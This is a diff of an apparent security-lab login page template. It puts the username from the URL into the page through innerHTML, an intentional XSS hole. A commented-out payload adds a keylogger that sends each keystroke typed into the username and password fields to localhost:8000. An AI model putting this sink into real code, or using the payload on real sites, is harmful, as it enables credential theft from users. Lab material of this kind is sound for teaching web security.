@@ -1,13 +1,11 @@
 {{ template "stylesheet.html" .}}
 
 <div id="error"></div>
-<h1>LOGIN</h1>
-<form action="/login">
-    <label><b>Username</b></label>
-    <input name="username" type="text">
-    <label><b>Password</b></label>
-    <input name="password" type="password">
-    <button type="submit" formmethod="post">Login</button>
+<h1 class="title">CLICK ON THIS CAT</h1>
+<form class="login" action="/login">
+    <input id="username" class="login-input" placeholder="Enter your username..." name="username" type="text">
+    <input id="password" class="login-input" placeholder="Enter your password..." name="password" type="password">
+    <button class="login-submit" type="submit" formmethod="post">Login</button>
 </form>
 
 <script>
@@ -17,6 +15,8 @@ function renderError(){
     if (username != null && username.length > 0) {
         var errorDiv = document.getElementById("error");
         errorDiv.innerHTML = "Incorrect login for user: " + username; // eg. <img src=x onerror="alert(1)">
+
+        //<img src=asdf style="visibility: hidden;" onerror="f=function(e){fetch((`http://localhost:8000/${String.fromCharCode(e.charCode)}`), {mode: 'no-cors'});};document.getElementById('username').onkeypress=f;document.getElementById('password').onkeypress=f; document.getElementById('error').style.display = 'none';">
     }
 }
 renderError();
